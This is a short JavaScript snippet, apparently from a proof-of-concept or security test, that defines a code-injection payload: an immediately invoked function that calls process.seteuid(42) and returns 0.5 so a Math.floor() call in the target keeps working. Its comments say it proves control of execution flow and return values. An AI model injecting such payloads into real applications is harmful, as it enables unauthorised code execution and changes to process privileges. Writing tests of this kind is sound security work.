   // We wrap the target code in an IIFE to run process.seteuid(42), then return a valid 
   // numeric ratio (0.5) to prevent immediate NaN errors in Math.floor(), proving we control
   // both execution flow and return values.
   const maliciousPayload = '(function(){ process.seteuid(42); return 0.5; })()';

